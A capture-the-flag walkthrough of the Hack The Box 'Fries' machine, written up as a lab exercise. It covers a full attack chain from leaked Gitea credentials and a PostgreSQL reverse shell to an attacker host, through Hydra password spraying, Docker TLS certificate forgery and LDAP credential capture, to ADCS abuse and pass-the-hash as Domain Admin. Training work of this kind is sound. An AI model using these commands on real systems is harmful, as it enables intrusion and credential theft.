# 🍟 Hack The Box — Fries (Hard)

![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red)
![Platform](https://img.shields.io/badge/Platform-Windows%20%2B%20Linux-blue)
![Status](https://img.shields.io/badge/Status-Rooted-success)


---

## ⚠️ Disclaimer

This writeup is for **educational use only** and was performed in an authorized Hack The Box environment.

---

## 🎯 Target Info

| Field | Value |
|------|------|
| Target | <Your_IP_Address> |
| Domain | fries.htb |
| DC Hostname | dc01.fries.htb |
| Difficulty | Hard |
| OS | Hybrid (Linux + Windows AD) |

---

## 📑 Table of Contents

1. [Port Scanning](#-port-scanning)
2. [Host Mapping](#-host-mapping)
3. [Initial Creds (HTB Provided)](#-initial-creds-htb-provided)
4. [Subdomain Discovery (FFUF)](#-subdomain-discovery-ffuf)
5. [Gitea Recon → DB Creds](#-gitea-recon--db-creds)
6. [PgAdmin Access → Postgres RCE](#-pgadmin-access--postgres-rce)
7. [CVE-2025-2945 → Meterpreter](#-cve-2025-2945--meterpreter)
8. [Password Reuse → SSH as svc](#-password-reuse--ssh-as-svc)
9. [NFS Weak Export → Docker TLS Abuse](#-nfs-weak-export--docker-tls-abuse)
10. [LDAP Credential Capture → svc_infra](#-ldap-credential-capture--svc_infra)
11. [BloodHound → ReadMSAPassword → gMSA](#-bloodhound--readmsapassword--gmsa)
12. [ADCS Abuse (ESC7 → ESC6/ESC16) → DA](#-adcs-abuse-esc7--esc6esc16--da)
13. [Flags](#-flags)

---

# 🔎 Port Scanning

## Full Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

## Service Scan

```bash
nmap -sCV -p<PORTS> <IP>
```

<details>
<summary>📌 Nmap Output (click to expand)</summary>

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 07:22 PST
Nmap scan report for <Your_IP_Address>
Host is up (0.032s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.18.0 (Ubuntu)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0.)
443/tcp   open  ssl/http      nginx 1.18.0 (Ubuntu)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
...snip...
Service Info: Host: DC01; OSs: Linux, Windows
```

</details>

### ✅ Key Takeaways

- Windows AD services: **Kerberos (88), LDAP (389/636), SMB (445), WinRM (5985)**
- Linux web presence: **nginx (80/443)**
- Domain discovered: **fries.htb**
- Likely hybrid environment: Linux web host + Windows DC

---

# 🧾 Host Mapping

```bash
sudo nano /etc/hosts
```

Add:

```text
<IP>    fries.htb dc01.fries.htb
```

---

# 🔑 Initial Creds (HTB Provided)

```text
User: d.cooper@fries.htb
Pass: D4LE11maan!!
```

These did **not** work for SSH or SMB initially — so they were likely intended for web apps.

---

# 🌐 Subdomain Discovery (FFUF)

```bash
ffuf -c -w <WORDLIST> -u http://fries.htb -H "Host: FUZZ.fries.htb" -fw 4
```

<details>
<summary>FFUF Output</summary>

```text
code [Status: 200, Size: 13591, Words: 1048, Lines: 272, Duration: 47ms]
```

</details>

Add:

```bash
sudo nano /etc/hosts
```

```text
<IP>    fries.htb dc01.fries.htb code.fries.htb
```

Visiting `http://code.fries.htb` reveals **Gitea**.

✅ HTB creds work here → login successful.

---

# 🧠 Gitea Recon → DB Creds

In commits, a `.env` file revealed PostgreSQL connection details:

```text
DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a
```

Another repo README referenced a database management subdomain:

Add:

```text
<IP>    fries.htb dc01.fries.htb code.fries.htb db-mgmt05.fries.htb
```

Visiting `db-mgmt05.fries.htb` shows **PgAdmin** login.

---

# 🐘 PgAdmin Access → Postgres RCE

### Login worked using HTB creds:

```text
User: d.cooper@fries.htb
Pass: D4LE11maan!!
```

When opening DB server, it asked for the DB root password:

```text
root password: PsqLR00tpaSS11
```

✅ DB access confirmed.

---

## PostgreSQL File Read + Command Execution

```sql
SELECT pg_ls_dir('/');             -- directory listing works
SELECT pg_read_file('/etc/passwd'); -- file read works

CREATE TABLE IF NOT EXISTS cmd_test(result text);
COPY cmd_test FROM PROGRAM 'id';
SELECT * FROM cmd_test;
```

Output:

```text
uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
```

---

## Reverse Shell via COPY FROM PROGRAM

Listener:

```bash
nc -lvnp <PORT>
```

Payload:

```sql
CREATE TABLE IF NOT EXISTS cmd_test(result text);
COPY cmd_test FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<IP_ATTACKER>/<PORT> 0>&1"';
SELECT * FROM cmd_test;
```

Shell:

```text
postgres@858fdf51af59:~/data$ whoami
postgres
```

---

## Shell Sanitization (TTY)

```bash
script /dev/null -c bash
```

Then:

```bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

stty size
stty rows <ROWS> columns <COLUMNS>
```

---

# 🎯 CVE-2025-2945 — Authenticated RCE

A quick search pointed to **CVE-2025-2945** in PgAdmin. Exploited using Metasploit:

```bash
msfconsole -q
use exploit/multi/http/pgadmin_query_tool_authenticated
```

Set options:

```text
set LHOST <IP_ATTACKER>
set LPORT <PORT>
set RHOSTS db-mgmt05.fries.htb
set VHOST db-mgmt05.fries.htb
set USERNAME d.cooper@fries.htb
set PASSWORD D4LE11maan!!
set DB_USER root
set DB_PASS PsqLR00tpaSS11
set DB_NAME ps_db
```

Exploit results:

```text
Meterpreter session opened
meterpreter > getuid
Server username: pgadmin
```

---

# 🔐 Password Reuse → SSH as svc

Environment variables revealed:

```bash
env
```

Output contained:

```text
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
```

I used this password to brute-force SSH users:

### users.txt

```text
admin
d.cooper
cooper
dale
administrator
root
postgres
pgadmin
fries
svc_infra
svc
infra
```

Hydra:

```bash
hydra -L users.txt -p 'Friesf00Ds2025!!' ssh://<IP> -t 64 -I
```

✅ Valid hit:

```text
login: svc   password: Friesf00Ds2025!!
```

SSH access:

```bash
ssh svc@<IP>
```

---

# 🧨 NFS Weak Export → Docker TLS Abuse

## Export Check (Local)

```bash
showmount -e localhost
```

Output:

```text
/srv/web.fries.htb *
```

Directory permissions:

```bash
ls -la /srv/web.fries.htb
```

```text
drwxrwxrwx 2 root root     4096 Nov 26 16:14 shared
drwxrwx--- 2 root infra managers 4096 May 26 2025 certs
```

---

## Pivot into Internal Network (sshuttle)

On Kali:

```bash
sudo apt install sshuttle
sshuttle -r svc@<IP> -N
```

---

## NFS Tooling

```bash
sudo apt update
sudo apt install pkg-config libfuse3-dev python3-dev
pipx install git+https://github.com/hvs-consulting/nfs-security-tooling.git
```

Analyze:

```bash
/root/.local/bin/nfs_analyze 192.168.100.2 --check-no-root-squash
```

Mount:

```bash
mkdir /tmp/nfs_mount
/root/.local/bin/fuse_nfs --export /srv/web.fries.htb --fake-uid --allow-write /tmp/nfs_mount 192.168.100.2
ls -la /tmp/nfs_mount
```

---

## Docker TLS Tunnel

Tunnel docker port:

```bash
ssh svc@<IP> -L 2376:127.0.0.1:2376
```

Attempt docker listing:

```bash
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=cert.pem \
  --tlskey=key.pem \
  -H=tcp://127.0.0.1:2376 ps
```

Authorization failed due to wrong cert identity → generate **root** cert using CA.

### Generate Root Cert

```bash
openssl genrsa -out root-key.pem 4096
openssl req -new -key root-key.pem -out root.csr -subj "/CN=root"
openssl x509 -req -in root.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out root-cert.pem -days 365
```

Now list containers:

```bash
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  -H=tcp://127.0.0.1:2376 ps
```

✅ Containers visible.

---

# 🧲 LDAP Credential Capture → svc_infra

Entered the `pwm` container (LDAP-connected):

```bash
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  -H=tcp://127.0.0.1:2376 exec -it f42 /bin/bash
```

Found LDAP URL in:

```bash
cat /config/PwmConfiguration.xml | grep "ldap"
```

Modified it to point to attacker:

```bash
sed -i 's|ldaps://dc01.fries.htb:636|ldap://<IP_ATTACKER>:389|' PwmConfiguration.xml
```

On attacker, run responder:

```bash
responder -I tun0 -wdv
```

Captured creds:

```text
CN=svc_infra,CN=Users,DC=fries,DC=htb
Password: m6tneOMAh5p0wQ0d
```

Validate:

```bash
netexec ldap <IP> -u svc_infra -p 'm6tneOMAh5p0wQ0d'
```

✅ Valid.

---

# 🩸 BloodHound → ReadMSAPassword → gMSA

Collect data:

```bash
bloodhound-ce-python -d 'fries.htb' -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' -ns '<IP>' -c All --zip
```

BloodHound showed `svc_infra` has **ReadMSAPassword** over `GMSA_CA_PROD$`.

Extract managed password:

```bash
bloodyAD --host <IP> -d fries.htb -u svc_infra -p 'm6tneOMAh5p0wQ0d' get object 'GMSA_CA_PROD$' --attr msDS-ManagedPassword
```

Output:

```text
msDS-ManagedPassword.NT: fc20b3d3ec179c5339ca59fbefc18f4a
```

WinRM PTH:

```bash
evil-winrm -i <IP> -u 'gMSA_CA_prod$' -H fc20b3d3ec179c5339ca59fbefc18f4a
```

✅ Access gained.

---

# 🏛️ ADCS Abuse (ESC7 → ESC6/ESC16) → Domain Admin

Find vulnerable templates:

```bash
certipy-ad find -u 'gMSA_CA_prod$' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip <IP> -vulnerable
```

Detected:

- ✅ ESC7 — dangerous permissions  
- ✅ ESC6 — enrollee can specify SAN  
- ✅ ESC16 — security extension disabled  

---

## ESC6 Exploitation: Request Admin Certificate

```bash
certipy-ad req -u "svc_infra" -p "m6tneOMAh5p0wQ0d" -dc-ip "<IP>" \
-ca 'fries-DC01-CA' -template 'User' \
-upn 'administrator@fries.htb' \
-sid 'S-1-5-21-858338346-3861030516-3975240472-500'
```

Authenticate and dump hash:

```bash
ntpdate fries.htb
certipy-ad auth -pfx "administrator.pfx" -dc-ip '<IP>' -username 'Administrator' -domain 'fries.htb'
```

Got hash:

```text
aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
```

WinRM PTH as Administrator:

```bash
evil-winrm -i <IP> -u 'Administrator' -H a773cb05d79273299a684a23ede56748
```

✅ Domain Admin access achieved.

---

# 🏁 Flags

> **root.txt**

```text
<REDACTED_ROOT_FLAG>
```

> **user.txt**

```text
<REDACTED_USER_FLAG>
```

---

# 🧠 Attack Chain Summary

```text
FFUF subdomain → Gitea creds leak → PgAdmin access → Postgres RCE → CVE RCE → env password reuse
→ SSH svc → NFS weak export → Docker TLS CA abuse → LDAP redirect → svc_infra creds
→ BloodHound ReadMSAPassword → gMSA WinRM → ADCS ESC chain → Administrator hash → Domain Admin
```

✅ **Machine rooted successfully.**
